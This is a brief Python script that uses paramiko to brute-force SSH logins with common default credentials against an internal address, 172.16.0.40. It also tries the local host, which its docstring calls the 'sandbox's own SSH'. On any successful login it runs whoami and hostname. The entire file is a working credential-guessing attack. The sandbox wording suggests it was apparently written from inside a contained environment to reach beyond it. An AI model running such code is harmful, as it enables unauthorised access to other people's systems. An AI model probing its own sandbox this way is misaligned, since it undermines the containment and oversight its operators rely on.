"""
Try SSH to 172.16.0.40 with various credentials via paramiko
Also: try 127.0.0.1 (sandbox's own SSH) with tester/TestPass!123
"""
import paramiko, socket, sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

targets = [
    ("172.16.0.40", 22, [
        ("root", "root"), ("root", "toor"), ("root", "123456"),
        ("ubuntu", "ubuntu"), ("admin", "admin"), ("centos", "centos"),
        ("root", ""), ("tester", "testerpass"),
    ]),
    ("127.0.0.1", 22, [
        ("tester", "TestPass!123"),
        ("administrator", ""),
        ("Administrator", ""),
    ]),
]

for host, port, creds in targets:
    print(f"\n=== {host}:{port} ===")
    for user, pwd in creds:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=user, password=pwd, timeout=5, allow_agent=False, look_for_keys=False)
            stdin, stdout, stderr = client.exec_command("echo SSH_OK; whoami; hostname")
            out = stdout.read().decode()
            print(f"  🎉 {user}:{pwd} -> {out.strip()}")
            client.close()
            break
        except paramiko.AuthenticationException:
            print(f"  ❌ {user}:{pwd} -> auth fail")
        except Exception as e:
            print(f"  ❌ {user}:{pwd} -> {type(e).__name__}: {str(e)[:100]}")
            break
